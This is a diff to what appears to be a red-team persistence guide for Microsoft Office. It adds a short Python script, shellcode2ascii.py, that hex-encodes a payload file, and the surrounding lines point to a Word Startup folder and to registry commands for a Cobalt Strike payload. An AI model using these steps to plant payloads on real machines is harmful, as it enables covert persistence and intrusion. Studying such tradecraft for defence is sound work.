@@ -23,6 +23,21 @@ cd C:\Users\NoRed0x\AppData\Roaming\Microsoft\Word\Startup
 <img src="/img/p/office.PNG" alt="Getting-gz" width="800" height="110"> 
 <img src="/img/p/office1.PNG" alt="Getting-gz" width="800" height="110"> 
 
+
+
+## shellcode2ascii.py
+```
+if __name__ == '__main__':
+    try:
+	with open(sys.argv[1]) as dllFileHandle:
+        	dllBytes = bytearray(dllFileHandle.read())
+		dllFileHandle.close()
+    except IOError:
+	print("Error reading file")
+    print("".join("{:02X}".format(c) for c in dllBytes))
+
+```
+
 ## Commands for updating registry with Cobalt Strike payload
 ```
 python shellcode2ascii.py payload.bin
